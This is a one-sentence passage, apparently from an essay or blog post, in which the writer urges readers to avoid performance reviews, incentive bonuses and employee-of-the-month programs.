But if you do have any choice in the matter , I ’d recommend that you run fleeing from any kind of performance review , incentive bonus , or stupid corporate employee - of - the - month program .
